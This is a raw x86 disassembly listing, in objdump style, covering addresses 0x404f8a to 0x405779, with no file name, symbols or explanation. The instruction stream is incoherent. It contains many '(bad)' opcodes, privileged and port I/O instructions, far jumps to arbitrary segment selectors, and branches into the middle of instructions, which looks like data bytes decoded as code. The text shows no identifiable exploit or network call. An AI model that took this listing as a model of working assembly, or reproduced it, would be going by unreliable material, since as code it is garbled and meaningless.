  404f8a:	xchg   ebx,eax
  404f8b:	pop    esi
  404f8c:	out    dx,eax
  404f8d:	push   0x58
  404f8f:	les    edi,FWORD PTR [edi-0x7b]
  404f92:	das    
  404f93:	add    DWORD PTR [edx],esp
  404f95:	dec    edi
  404f96:	test   eax,0x65c69250
  404f9b:	fild   QWORD PTR [esi+0x6d88a9cb]
  404fa1:	ins    BYTE PTR es:[edi],dx
  404fa2:	xchg   ebx,eax
  404fa3:	retf   
  404fa4:	mov    ds,WORD PTR [eax-0x75]
  404fa7:	add    ebp,DWORD PTR [edi+eax*2+0x140d468d]
  404fae:	push   edx
  404faf:	jl     0x404f51
  404fb1:	int    0x5b
  404fb3:	leave  
  404fb4:	jo     0x404fec
  404fb6:	inc    edi
  404fb7:	pop    edi
  404fb8:	icebp  
  404fb9:	inc    ebx
  404fba:	mov    dl,0x3a
  404fbc:	jbe    0x404faf
  404fbe:	hlt    
  404fbf:	and    al,BYTE PTR [ecx]
  404fc1:	add    BYTE PTR ds:0x29194c21,dl
  404fc7:	clc    
  404fc8:	call   0x18f:0x6ffce529
  404fcf:	pop    ebp
  404fd0:	inc    ebp
  404fd1:	pushf  
  404fd2:	faddp  st(6),st
  404fd4:	xchg   ebp,eax
  404fd5:	ror    BYTE PTR [ebx-0x2d5a4223],0x33
  404fdc:	je     0x405059
  404fde:	pop    ebx
  404fdf:	arpl   WORD PTR [ecx+0x48895f67],ax
  404fe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fe6:	(bad)
  404fe9:	mov    es:0xfa03d6b0,eax
  404fef:	stc    
  404ff0:	and    ebx,DWORD PTR [ebx+0x2c]
  404ff3:	push   ebp
  404ff4:	pop    esp
  404ff5:	stc    
  404ff6:	imul   edx,DWORD PTR [eax+0x5e2aa188],0xd6f9976
  405000:	jne    0x404ffe
  405002:	sbb    al,0x7
  405004:	push   cs
  405005:	xchg   ebx,eax
  405006:	enter  0x4658,0x4
  40500a:	gs jae 0x404fef
  40500d:	ja     0x404fcd
  40500f:	sbb    al,0xca
  405011:	inc    esi
  405012:	or     ebp,DWORD PTR [ecx-0x1d9ee97b]
  405018:	jb     0x40505b
  40501a:	push   es
  40501b:	and    ch,BYTE PTR [ecx+0xd7940f1]
  405021:	cmp    al,0x50
  405023:	adc    eax,0xbcf73fde
  405028:	push   0x1650c6df
  40502d:	add    esp,edx
  40502f:	adc    ch,BYTE PTR [esi-0x2f]
  405032:	stc    
  405033:	sbb    esp,DWORD PTR [edi-0x6fd679de]
  405039:	or     edx,DWORD PTR [edi]
  40503b:	scas   eax,DWORD PTR es:[edi]
  40503c:	lods   al,BYTE PTR ds:[esi]
  40503d:	pop    esp
  40503e:	push   sp
  405040:	xchg   DWORD PTR [ecx+0x24],esi
  405043:	cwde   
  405044:	mov    ah,0xac
  405046:	xor    eax,DWORD PTR [eax-0x67c11647]
  40504c:	test   eax,0x6c4bb2e4
  405051:	xchg   BYTE PTR [edx+0x53],bl
  405054:	pop    ecx
  405055:	aaa    
  405056:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405057:	addr16 and eax,0xa0b0270e
  40505d:	fdiv   DWORD PTR ds:0xe74ffb2b
  405063:	jae    0x40500a
  405065:	sub    esi,DWORD PTR [edi+eax*8+0x78]
  405069:	mov    BYTE PTR [ecx+eiz*4],al
  40506c:	pop    edi
  40506d:	(bad)  
  40506e:	int    0x68
  405070:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405071:	mov    esp,0x323125ca
  405076:	leave  
  405077:	sti    
  405078:	cld    
  405079:	or     BYTE PTR [ebp+edx*1+0x3ad2435b],dl
  405080:	in     eax,0xa
  405082:	mov    es,ebx
  405084:	test   DWORD PTR [ebx+0x12],0x9a8505ec
  40508b:	jg     0x4050b3
  40508d:	sbb    BYTE PTR [edx-0x15],bl
  405090:	jb     0x4050d1
  405092:	mov    cl,0x39
  405094:	outs   dx,DWORD PTR ds:[esi]
  405095:	push   esi
  405096:	outs   dx,BYTE PTR ds:[esi]
  405097:	popa   
  405098:	push   es
  405099:	arpl   WORD PTR [ebx-0x2e],bp
  40509c:	and    BYTE PTR [edx-0x6c],dh
  40509f:	mov    esp,0x7b0fa780
  4050a4:	ror    DWORD PTR [ebx+0x1ea090aa],1
  4050aa:	xchg   edx,eax
  4050ab:	es int3 
  4050ad:	std    
  4050ae:	and    al,0x28
  4050b0:	jle    0x40503b
  4050b2:	fmul   DWORD PTR [eax-0x26]
  4050b5:	push   edi
  4050b6:	mov    ah,0x7
  4050b8:	loopne 0x40505e
  4050ba:	dec    edx
  4050bb:	int3   
  4050bc:	jecxz  0x4050e5
  4050be:	mov    dh,0x4a
  4050c0:	sahf   
  4050c1:	in     eax,dx
  4050c2:	call   0xdad3a2a7
  4050c7:	xchg   BYTE PTR [ecx+0x56],cl
  4050ca:	xchg   esp,eax
  4050cb:	retf   0x278e
  4050ce:	mov    ds:0x719e33af,al
  4050d3:	out    dx,al
  4050d4:	sti    
  4050d5:	cli    
  4050d6:	sub    edi,DWORD PTR [edx+0x5e]
  4050d9:	pop    ss
  4050da:	fwait
  4050db:	mov    dh,bh
  4050dd:	xchg   edi,eax
  4050de:	jmp    0x6754:0x651d7544
  4050e5:	ins    BYTE PTR es:[edi],dx
  4050e6:	mov    cl,0xb7
  4050e8:	stos   BYTE PTR es:[edi],al
  4050e9:	inc    ecx
  4050ea:	mov    eax,ds:0xb24e190d
  4050ef:	ja     0x40510f
  4050f1:	fs pop edi
  4050f3:	inc    DWORD PTR [edx+0x7cf9b948]
  4050f9:	add    eax,0x70a0cf0e
  4050fe:	outs   dx,DWORD PTR ds:[esi]
  4050ff:	mov    ecx,0xc12d5cd
  405104:	jns    0x405100
  405106:	dec    esi
  405107:	mov    ds:0x60914414,al
  40510c:	cmp    DWORD PTR ds:0x345b1b65,edi
  405112:	adc    edx,eax
  405114:	into   
  405115:	ficomp WORD PTR cs:[esi+0x2a]
  405119:	inc    edx
  40511a:	lods   eax,DWORD PTR ds:[esi]
  40511b:	push   ss
  40511c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40511d:	inc    edx
  40511e:	ds (bad) 
  405120:	xchg   ebx,eax
  405121:	stc    
  405122:	push   esi
  405123:	xlat   BYTE PTR ds:[ebx]
  405124:	add    eax,0xc297b89
  405129:	xlat   BYTE PTR ds:[ebx]
  40512a:	lock ds xchg edx,eax
  40512d:	scas   al,BYTE PTR es:[edi]
  40512e:	jmp    0x405177
  405130:	(bad)  
  405131:	mov    ebx,0xa92feee9
  405136:	xchg   ecx,eax
  405137:	sub    eax,0x7b58c182
  40513c:	xchg   BYTE PTR [edx-0x74dd7715],cl
  405142:	cdq    
  405143:	std    
  405144:	adc    eax,DWORD PTR [ebx-0x2c]
  405147:	jbe    0x405116
  405149:	xchg   edi,eax
  40514a:	pop    ebp
  40514b:	xchg   BYTE PTR [eax],ch
  40514d:	jge    0x4050e1
  40514f:	push   ds
  405150:	jno    0x4051c6
  405152:	(bad)  
  405153:	mov    ebp,0x85811d39
  405158:	inc    ecx
  405159:	pop    ebp
  40515a:	lods   eax,DWORD PTR ds:[esi]
  40515b:	or     edx,DWORD PTR cs:[edi+0x1b819605]
  405162:	ins    DWORD PTR es:[edi],dx
  405163:	enter  0x5f5f,0xfa
  405167:	push   edi
  405168:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405169:	sub    al,0x15
  40516b:	fstp   DWORD PTR ds:[ebp+0x1f]
  40516f:	dec    ebx
  405170:	jbe    0x4051d0
  405172:	cmp    edx,DWORD PTR [edx+0x79966b2a]
  405178:	xchg   ecx,eax
  405179:	push   cs
  40517a:	adc    ebp,DWORD PTR [esi+0x1b5e6d0f]
  405180:	and    edi,DWORD PTR [esi+0xb]
  405183:	out    0x81,eax
  405185:	addr16 jae 0x4051a2
  405188:	xchg   esp,eax
  405189:	(bad)  
  40518a:	fidivr DWORD PTR [ebp+0x6]
  40518d:	xor    BYTE PTR [edi],bh
  40518f:	pushf  
  405190:	ja     0x4051bc
  405192:	inc    ebx
  405193:	push   ss
  405194:	jae    0x4051ec
  405196:	rcr    DWORD PTR [esi+0x309d0ea8],1
  40519c:	jmp    0x9c57:0x98aa3114
  4051a3:	repz into 
  4051a5:	daa    
  4051a6:	cmp    BYTE PTR [esi],al
  4051a8:	add    eax,0x3d46a518
  4051ad:	pushf  
  4051ae:	and    ch,BYTE PTR [ebx+0x5683d6c8]
  4051b4:	or     dh,BYTE PTR [edx-0x21]
  4051b7:	lods   al,BYTE PTR ds:[esi]
  4051b8:	jp     0x405238
  4051ba:	xchg   ch,bh
  4051bc:	inc    DWORD PTR [ebx+ebx*8]
  4051bf:	loope  0x405163
  4051c1:	aad    0xa3
  4051c3:	(bad)  
  4051c4:	and    al,0xc2
  4051c6:	inc    edi
  4051c7:	inc    ebp
  4051c8:	cmp    ch,al
  4051ca:	aad    0x2b
  4051cc:	je     0x405171
  4051ce:	mov    esi,0x162808c3
  4051d3:	pop    esi
  4051d4:	mov    bh,0x2e
  4051d6:	sub    bh,BYTE PTR [esi+ebp*1+0x691458d]
  4051dd:	sahf   
  4051de:	mov    eax,0x4fc87afc
  4051e3:	xor    edi,DWORD PTR [ebp-0x14]
  4051e6:	(bad)  
  4051e7:	sbb    al,0x14
  4051e9:	push   es
  4051ea:	sbb    ah,BYTE PTR [edx+0x27]
  4051ed:	pop    esp
  4051ee:	dec    ebx
  4051ef:	jp     0x40523b
  4051f1:	sbb    al,0x3d
  4051f3:	mov    bl,BYTE PTR [eax-0x70fa55a6]
  4051f9:	addr16 sub ch,al
  4051fc:	jmp    0x405190
  4051fe:	popf   
  4051ff:	mov    dl,dh
  405201:	(bad)  
  405203:	add    bh,BYTE PTR [esi-0x71]
  405206:	pop    ds
  405207:	out    dx,eax
  405208:	mov    al,0x58
  40520a:	mov    al,ds:0x61b8c5f4
  40520f:	jg     0x4051c4
  405211:	mov    esi,eax
  405213:	pop    ss
  405214:	popa   
  405215:	hlt    
  405216:	push   0xb8ccbe3
  40521b:	add    ebp,DWORD PTR [edi-0x7569c362]
  405221:	mov    ds:0xaf762e4d,al
  405226:	mov    edx,0x8fefb285
  40522b:	cmp    BYTE PTR [eax-0x16],al
  40522e:	in     eax,0x1b
  405230:	fcomp  DWORD PTR [esi-0x58]
  405233:	out    0x9d,al
  405235:	fiadd  WORD PTR [edx+ecx*4]
  405238:	dec    eax
  405239:	mov    ebp,0x2891c3c5
  40523e:	mov    ebx,0xc02c5bc3
  405243:	push   ds
  405244:	fnstenv ds:0x26d46cc0
  40524a:	xor    al,0x74
  40524c:	xchg   ebp,eax
  40524d:	(bad)  [esi+0x3974d39b]
  405253:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405254:	xor    eax,0x2644e5d3
  405259:	stc    
  40525a:	add    BYTE PTR [edx+0x11536fb7],0x30
  405261:	jge    0x40527a
  405263:	pop    esp
  405264:	ds jns 0x405255
  405267:	inc    ebp
  405268:	mov    eax,ds:0xbd161c58
  40526d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40526e:	lea    ecx,[ebx-0x2cc46887]
  405274:	mov    gs,edi
  405276:	mov    esi,0xf9ab520b
  40527b:	sub    al,0x11
  40527d:	clc    
  40527e:	and    BYTE PTR [edx+0x78ef23dd],al
  405284:	stos   BYTE PTR es:[edi],al
  405285:	lea    edx,[edx]
  405287:	fwait
  405288:	sub    DWORD PTR ds:0x99c48de4,eax
  40528e:	xchg   ebp,eax
  40528f:	mov    ds:0xdb64dc2b,al
  405294:	bound  ebp,QWORD PTR [edi-0x314776bf]
  40529a:	push   ebp
  40529b:	sub    eax,0x2e873562
  4052a0:	jno    0x405315
  4052a2:	pop    es
  4052a3:	retw   
  4052a5:	or     dl,BYTE PTR [ecx-0x15449411]
  4052ab:	or     BYTE PTR [edx-0x65],dh
  4052ae:	and    al,0x96
  4052b0:	ins    DWORD PTR es:[edi],dx
  4052b1:	or     esi,edx
  4052b3:	jmp    0x4d60:0x99a6886d
  4052ba:	pop    ss
  4052bb:	inc    ecx
  4052bc:	bnd call 0xb0111921
  4052c2:	addr16 mov dl,0xf4
  4052c5:	pop    ecx
  4052c6:	dec    ebx
  4052c7:	lahf   
  4052c8:	xor    ebp,DWORD PTR [ecx]
  4052ca:	push   ebx
  4052cb:	call   0xdbed901d
  4052d0:	xchg   esi,eax
  4052d1:	les    ebx,FWORD PTR [edx-0x21d6355e]
  4052d7:	(bad)  
  4052d8:	lods   eax,DWORD PTR ds:[esi]
  4052d9:	repz gs jle 0x405287
  4052dd:	fld    st(3)
  4052df:	xchg   ebp,eax
  4052e0:	dec    esi
  4052e1:	cs dec ebx
  4052e3:	mov    ds:0x7e4cac0c,eax
  4052e8:	sub    al,0xb5
  4052ea:	fstp   DWORD PTR [ebx+eiz*1-0xc8a7e97]
  4052f1:	jno    0x4052dd
  4052f3:	cmp    edi,DWORD PTR [eax+0x1cc370e8]
  4052f9:	ins    DWORD PTR es:[edi],dx
  4052fa:	push   ds
  4052fb:	ins    DWORD PTR es:[edi],dx
  4052fc:	push   ss
  4052fd:	aad    0xca
  4052ff:	and    ebp,DWORD PTR [ebx-0x565fa210]
  405305:	nop
  405306:	daa    
  405307:	add    ebp,edx
  405309:	ret    0xd838
  40530c:	stc    
  40530d:	pop    eax
  40530e:	push   0xffffffc2
  405310:	inc    ebp
  405311:	cs scas eax,DWORD PTR es:[edi]
  405313:	add    ebx,DWORD PTR [ebx-0x4babf924]
  405319:	lahf   
  40531a:	(bad)  
  40531b:	sub    al,0xe6
  40531d:	pushf  
  40531e:	push   ebp
  40531f:	ret    0xaa85
  405322:	aas    
  405323:	inc    esp
  405324:	(bad)  
  405325:	xor    eax,0xf12d171f
  40532a:	mov    edx,0x988aee77
  40532f:	or     BYTE PTR [ebp-0x50],al
  405332:	push   cs
  405333:	out    0x8a,al
  405335:	das    
  405336:	and    eax,0x26286ada
  40533b:	jmp    0xdfb9:0x29c22bae
  405342:	dec    ebx
  405343:	and    BYTE PTR [ebp+0x6a],cl
  405346:	xchg   edi,eax
  405347:	cmp    edx,DWORD PTR [ecx+0x9]
  40534a:	pop    ds
  40534b:	sub    esi,DWORD PTR ds:0x521bb7e2
  405351:	cdq    
  405352:	mov    ds:0x4ec402b0,al
  405357:	pop    ecx
  405358:	xchg   ebp,eax
  405359:	or     ecx,edi
  40535b:	rol    DWORD PTR [ecx+0x7d],1
  40535e:	out    0x63,eax
  405360:	int    0xd3
  405362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405363:	cmp    al,0xda
  405365:	iret   
  405366:	mov    ah,0x7c
  405368:	lds    ebp,FWORD PTR [ebx+0x4]
  40536b:	push   cs
  40536c:	ins    BYTE PTR es:[edi],dx
  40536d:	imul   ecx,edi,0xf0059718
  405373:	arpl   WORD PTR [ecx],di
  405375:	fs repz fst st(0)
  405379:	cs jmp 0x2e85:0xdabb9f93
  405381:	loop   0x4053e9
  405383:	cmp    bh,cl
  405385:	dec    ebp
  405386:	repnz repz mov eax,0x59aa6cf0
  40538d:	inc    edx
  40538e:	and    dl,dh
  405390:	ror    DWORD PTR [edx],0x26
  405393:	push   0xffffff8e
  405395:	dec    ebp
  405396:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405397:	mov    esi,DWORD PTR [edi-0x72d890db]
  40539d:	pop    edx
  40539e:	mov    ecx,0x9f5948f
  4053a3:	push   esi
  4053a4:	rcr    esp,1
  4053a6:	stos   BYTE PTR es:[edi],al
  4053a7:	mov    dl,0xa7
  4053a9:	ror    BYTE PTR [edi-0x4e73bfff],cl
  4053af:	inc    ebp
  4053b0:	inc    ebp
  4053b1:	in     eax,0xaa
  4053b3:	ja     0xf05bd45d
  4053b9:	or     DWORD PTR [esi-0x1c],eax
  4053bc:	loope  0x4053fa
  4053be:	imul   ebp,ebx,0x41bfac61
  4053c4:	cs (bad) 
  4053c6:	enter  0xcb92,0x77
  4053ca:	daa    
  4053cb:	or     eax,0x9c486163
  4053d0:	imul   ebp,DWORD PTR [ebp+edx*1+0x64da6926],0x4f665347
  4053db:	inc    edx
  4053dc:	sar    DWORD PTR [ebx-0x2f5e85c8],1
  4053e2:	(bad)  
  4053e3:	and    ch,BYTE PTR [ecx-0x185eea07]
  4053e9:	pop    esi
  4053ea:	hlt    
  4053eb:	jmp    0xe9001bad
  4053f0:	jmp    0x5d825312
  4053f5:	shr    esi,0xf5
  4053f8:	lea    ecx,[ecx]
  4053fa:	sbb    DWORD PTR [esi-0x73],esi
  4053fd:	and    edi,esi
  4053ff:	mov    ch,0x3b
  405401:	cwde   
  405402:	jno    0x405403
  405404:	mov    ds:0xf746f1cc,eax
  405409:	cmc    
  40540a:	or     BYTE PTR [edx],bh
  40540c:	int3   
  40540d:	and    DWORD PTR [esi],edi
  40540f:	icebp  
  405410:	dec    ebx
  405411:	pop    es
  405412:	fs fwait
  405414:	push   ds
  405415:	mov    ebx,0x88bde819
  40541a:	mov    eax,ebp
  40541c:	(bad)  
  40541d:	call   0xd1315b94
  405422:	dec    esp
  405423:	jnp    0x40548c
  405425:	loope  0x4053ea
  405427:	sbb    BYTE PTR [ecx+ecx*8+0x19920fbd],cl
  40542e:	popa   
  40542f:	xchg   edx,eax
  405430:	and    al,0x2
  405432:	add    BYTE PTR [edi+0x75],cl
  405435:	jne    0x40541d
  405437:	add    eax,0x41b64530
  40543c:	mov    dl,0x77
  40543e:	inc    ebp
  40543f:	xor    eax,0x8ce8b746
  405444:	and    eax,0xbac6025
  405449:	inc    ebx
  40544a:	loope  0x4054c7
  40544c:	push   edx
  40544d:	mov    ds:0xdd094b2,eax
  405452:	cmp    esp,edx
  405454:	dec    eax
  405455:	in     eax,dx
  405456:	mov    ah,0x61
  405458:	sub    eax,0xb5d4a991
  40545d:	sbb    al,BYTE PTR [ebp+0x5d]
  405460:	mov    al,0x37
  405462:	jae    0x405403
  405464:	push   0x60
  405466:	cmp    BYTE PTR [ebx+0x5365b36f],0xb4
  40546d:	rcr    DWORD PTR [edx-0xa],cl
  405470:	sbb    esi,eax
  405472:	cld    
  405473:	mov    BYTE PTR [eax-0x62],bl
  405476:	cs add ebp,edi
  405479:	(bad)  
  40547a:	cmp    al,0xea
  40547c:	cmp    al,0x5c
  40547e:	into   
  40547f:	cmp    DWORD PTR [ebx],0xffffff99
  405482:	mov    esi,0x12c11d29
  405487:	retf   0x3ca1
  40548a:	add    eax,0x7d72f650
  40548f:	mov    esi,0xc006380
  405494:	shl    DWORD PTR [edx-0x35],1
  405497:	retf   0xcb33
  40549a:	jno    0x4054c6
  40549c:	jp     0x405457
  40549e:	mov    eax,ds:0x3091d983
  4054a3:	stos   DWORD PTR es:[edi],eax
  4054a4:	mov    al,ds:0x89b16781
  4054a9:	pop    es
  4054aa:	xchg   edx,eax
  4054ab:	mov    esp,DWORD PTR [esi+0x1d51d225]
  4054b1:	fwait
  4054b2:	add    ebp,DWORD PTR [ecx-0x1455f6cd]
  4054b8:	outs   dx,BYTE PTR ds:[esi]
  4054b9:	jns    0x40552a
  4054bb:	jge    0x40547a
  4054bd:	scas   eax,DWORD PTR es:[edi]
  4054be:	adc    esi,DWORD PTR [eax]
  4054c0:	call   FWORD PTR [ebx+0x41]
  4054c3:	jl     0x40547a
  4054c5:	(bad)  
  4054c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054c7:	cmp    DWORD PTR [edx],ebp
  4054c9:	int3   
  4054ca:	sub    al,0x53
  4054cc:	mov    al,0xe9
  4054ce:	rcr    DWORD PTR [ebx+0xc],1
  4054d1:	xrstors [edx+0x5e]
  4054d5:	sub    ecx,0xc
  4054d8:	scas   al,BYTE PTR es:[edi]
  4054d9:	out    0xb2,eax
  4054db:	iret   
  4054dc:	push   edi
  4054dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054de:	bound  ecx,QWORD PTR [ecx-0x233dc0d8]
  4054e4:	mov    bh,0xa3
  4054e6:	sbb    al,0x67
  4054e8:	jge    0x4054f4
  4054ea:	mov    gs,WORD PTR [esi+0x1880ac08]
  4054f0:	jnp    0x4054b9
  4054f2:	sbb    BYTE PTR [esp+esi*4+0x4a],ch
  4054f6:	inc    ebx
  4054f7:	ins    BYTE PTR es:[edi],dx
  4054f8:	mov    ?,WORD PTR [eax]
  4054fa:	sub    DWORD PTR [ebp+eiz*8-0x13],0xffffffdc
  4054ff:	inc    edi
  405500:	or     BYTE PTR [ebp+0x74],bl
  405503:	pop    es
  405504:	dec    ebx
  405505:	add    ebp,edi
  405507:	fs inc ebx
  405509:	fisttp DWORD PTR [esi-0x748e4d7d]
  40550f:	pusha  
  405510:	cmp    eax,0x2a98c8f4
  405515:	scas   al,BYTE PTR es:[edi]
  405516:	(bad)  
  405517:	out    dx,eax
  405518:	pop    eax
  405519:	jnp    0x4054cd
  40551b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40551c:	or     al,0xdc
  40551e:	xor    ebp,eax
  405520:	sub    ebx,DWORD PTR [edi-0x53]
  405523:	loop   0x4054df
  405525:	dec    esi
  405526:	add    esi,DWORD PTR [esi]
  405528:	lea    edx,[esi]
  40552a:	sub    esp,edi
  40552c:	call   0x811d:0xc8f1f189
  405533:	aaa    
  405534:	ret    
  405535:	hlt    
  405536:	retf   
  405537:	mov    eax,ds:0xbd474e38
  40553c:	adc    ebp,ebx
  40553e:	mov    dh,BYTE PTR [ebx]
  405540:	fisub  WORD PTR [eax-0x6170e82]
  405546:	jmp    0x40559e
  405548:	mov    ch,0xd1
  40554a:	mov    bh,0x8d
  40554c:	cmpps  xmm0,xmm0,0x72
  405550:	xchg   edi,eax
  405551:	int    0xd9
  405553:	(bad)  
  405554:	sub    eax,0x86a06ac8
  405559:	pop    esi
  40555a:	and    bh,BYTE PTR [edx-0x24]
  40555d:	fxsave [ebp-0x5ef4ee32]
  405564:	shr    DWORD PTR [esi],0xde
  405567:	leave  
  405568:	jmp    0xd1ffae9
  40556d:	push   ebx
  40556e:	sbb    al,0x3b
  405570:	push   0xffffffc4
  405572:	push   eax
  405573:	add    al,0x45
  405575:	xor    DWORD PTR [edi-0x61a0f47f],ebx
  40557b:	adc    DWORD PTR [eax+ebx*4],edi
  40557e:	sub    BYTE PTR [ecx-0x6e],cl
  405581:	mov    DWORD PTR [eax],0x6d5f638d
  405587:	div    DWORD PTR [esi+0x56ae5630]
  40558d:	stos   BYTE PTR es:[edi],al
  40558e:	popa   
  40558f:	pusha  
  405590:	fimul  WORD PTR [edi-0xff5c8a0]
  405596:	imul   esp,DWORD PTR [ebp+edx*2+0x4e6eb9f8],0x916fed13
  4055a1:	pop    ebp
  4055a2:	jo     0x4055c1
  4055a4:	loopne 0x40555e
  4055a6:	rcr    esp,0x59
  4055a9:	xchg   ebp,eax
  4055aa:	retf   
  4055ab:	push   ebx
  4055ac:	xor    dh,BYTE PTR [esi]
  4055ae:	ins    DWORD PTR es:[edi],dx
  4055af:	scas   eax,DWORD PTR es:[edi]
  4055b0:	inc    esi
  4055b1:	inc    eax
  4055b2:	inc    ebx
  4055b3:	inc    ebx
  4055b4:	rol    DWORD PTR [edi-0x33],0x87
  4055b8:	add    eax,0x9427b202
  4055bd:	push   ecx
  4055be:	dec    edi
  4055bf:	dec    eax
  4055c0:	push   esp
  4055c1:	xchg   edx,eax
  4055c2:	scas   eax,DWORD PTR es:[edi]
  4055c3:	lds    edi,FWORD PTR [ecx-0x16]
  4055c6:	jl     0x40557b
  4055c8:	cmc    
  4055c9:	mov    BYTE PTR [edi+ecx*2],bh
  4055cc:	jge    0x405648
  4055ce:	and    al,0x36
  4055d0:	ins    BYTE PTR es:[edi],dx
  4055d1:	in     al,0xaf
  4055d3:	mov    dl,0x78
  4055d5:	cmp    esp,DWORD PTR [ebx+ebp*4-0x40]
  4055d9:	mov    ebx,0x7359d0c0
  4055de:	lea    eax,[esi+0x34937d10]
  4055e4:	ror    DWORD PTR [edi+0x78a4b473],0x40
  4055eb:	div    ebp
  4055ed:	push   esi
  4055ee:	xchg   ebx,eax
  4055ef:	and    bh,bl
  4055f1:	and    eax,0x8bd62617
  4055f6:	jbe    0x405676
  4055f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055f9:	scas   al,BYTE PTR es:[edi]
  4055fa:	test   ax,0x4f48
  4055fe:	jnp    0x4055ba
  405600:	cmp    DWORD PTR [ebx],0xffffffcb
  405603:	into   
  405604:	popa   
  405605:	dec    esi
  405606:	ja     0x40561e
  405608:	lods   eax,DWORD PTR ds:[esi]
  405609:	dec    esi
  40560a:	push   ecx
  40560b:	mov    al,ds:0x84bbc58d
  405610:	xchg   ebx,eax
  405611:	loopne 0x4055b1
  405613:	jae    0x40563e
  405615:	xor    DWORD PTR [edx],0x3d
  405618:	add    ah,BYTE PTR [ebp+0x418f289f]
  40561e:	and    ch,ch
  405620:	push   ss
  405621:	mov    dl,0xac
  405623:	jl     0x405691
  405625:	clc    
  405626:	and    BYTE PTR [edx-0x65fa267d],0x41
  40562d:	ja     0x405666
  40562f:	pusha  
  405630:	rcr    ah,1
  405632:	test   BYTE PTR [eax-0x62531a60],cl
  405638:	jae    0x405656
  40563a:	sbb    edx,edx
  40563c:	out    0x42,eax
  40563e:	lahf   
  40563f:	or     edi,edi
  405641:	les    edi,FWORD PTR [eax-0x7ef553d1]
  405647:	sbb    esi,DWORD PTR [ebx+0x62]
  40564a:	sahf   
  40564b:	lea    edi,[ecx+ebx*8+0x3c17d080]
  405652:	dec    edi
  405653:	mov    BYTE PTR [esi+0x7e],bh
  405656:	xlat   BYTE PTR ds:[ebx]
  405657:	adc    DWORD PTR [ebp-0x14d26bd7],0xf070eaa3
  405661:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405662:	cmp    dl,bh
  405664:	(bad)  
  405665:	xor    ch,BYTE PTR [edi]
  405667:	out    0xd8,eax
  405669:	xor    DWORD PTR ss:0x463023d7,0x9c945b65
  405674:	jmp    0x44760d1e
  405679:	in     al,0x5e
  40567b:	adc    BYTE PTR [eax],ch
  40567d:	jnp    0x405696
  40567f:	daa    
  405680:	mov    ss,WORD PTR cs:[ebp+0x34437781]
  405687:	mov    cl,0x97
  405689:	stos   BYTE PTR es:[edi],al
  40568a:	daa    
  40568b:	or     eax,0xfeb5b33c
  405690:	aad    0xbd
  405692:	jmp    0x56f1:0x4f0e6d37
  405699:	mov    dh,0xf3
  40569b:	adc    DWORD PTR cs:[edi],edi
  40569e:	inc    ebx
  40569f:	bound  esi,QWORD PTR [ecx+0x36fb766a]
  4056a5:	mov    ecx,0x6aae7b41
  4056aa:	add    al,0x43
  4056ac:	ja     0x4056f9
  4056ae:	cmc    
  4056af:	aam    0x75
  4056b1:	or     eax,edi
  4056b3:	shl    BYTE PTR [ecx+0x6c36fd9d],cl
  4056b9:	inc    esp
  4056ba:	repnz test al,0x1e
  4056bd:	dec    esp
  4056be:	insertq xmm2,(bad),0x78,0x12
  4056c2:	lahf   
  4056c3:	xor    ebx,DWORD PTR [ecx]
  4056c5:	push   ds
  4056c6:	imul   eax,DWORD PTR ds:0xc1ee4167,0x64
  4056cd:	sahf   
  4056ce:	js     0x405684
  4056d0:	test   al,0xc8
  4056d2:	test   DWORD PTR [esi],esi
  4056d4:	outs   dx,DWORD PTR ds:[esi]
  4056d5:	rcl    BYTE PTR [ecx-0x5949650b],0x51
  4056dc:	jecxz  0x4056c7
  4056de:	ja     0x40568c
  4056e0:	xchg   BYTE PTR [esi+eax*2-0x72],ch
  4056e4:	inc    esp
  4056e5:	in     al,0x94
  4056e7:	jle    0x4056e4
  4056e9:	adc    eax,0x7744f6c5
  4056ee:	inc    edi
  4056ef:	ficomp WORD PTR [edi-0x7d]
  4056f2:	arpl   di,dx
  4056f4:	ja     0x4056c4
  4056f6:	cmp    eax,0x2507d7a8
  4056fb:	xchg   BYTE PTR fs:[edx+0x64b60b4c],cl
  405702:	call   0x99f121ca
  405707:	xchg   ecx,eax
  405708:	lea    edx,[edx+0x76]
  40570b:	jo     0x405695
  40570d:	rcr    ebp,1
  40570f:	cmp    eax,0xe15af2c
  405714:	popf   
  405715:	lods   eax,DWORD PTR ds:[esi]
  405716:	push   0x8269b6c8
  40571b:	mov    ebx,0xa4e84b66
  405720:	mov    ah,0xde
  405722:	std    
  405723:	xchg   ebp,eax
  405724:	push   es
  405725:	pop    ecx
  405726:	or     al,0x1
  405728:	(bad)  
  405729:	jnp    0x4056df
  40572b:	xchg   ebx,eax
  40572c:	and    bh,BYTE PTR [eax-0x44]
  40572f:	cmp    DWORD PTR [ebp-0x57ab4150],eax
  405735:	test   edx,edx
  405737:	arpl   dx,di
  405739:	inc    ebx
  40573a:	xchg   esp,eax
  40573b:	in     al,0xc
  40573d:	add    ebx,0x5c
  405740:	or     BYTE PTR [ebx+0x4a],al
  405743:	out    dx,al
  405744:	(bad)
  405748:	or     ecx,DWORD PTR [edx-0x7b]
  40574b:	out    dx,eax
  40574c:	sbb    eax,0x87d8da15
  405751:	push   ds
  405752:	pop    ebx
  405753:	mov    ah,al
  405755:	inc    edx
  405756:	dec    eax
  405757:	lods   al,BYTE PTR ds:[esi]
  405758:	retf   
  405759:	push   esi
  40575a:	(bad)  [ebp-0x61]
  40575d:	aaa    
  40575e:	cmc    
  40575f:	mov    ds:0x53c9f3c2,al
  405764:	int    0xad
  405766:	and    DWORD PTR [edx-0x76],eax
  405769:	cli    
  40576a:	aam    0x46
  40576c:	jmp    0x405746
  40576e:	push   es
  40576f:	out    dx,al
  405770:	mov    esp,0xd7dcdc35
  405775:	popa   
  405776:	(bad)  
  405777:	mul    ebx
  405779:	aad    0x45
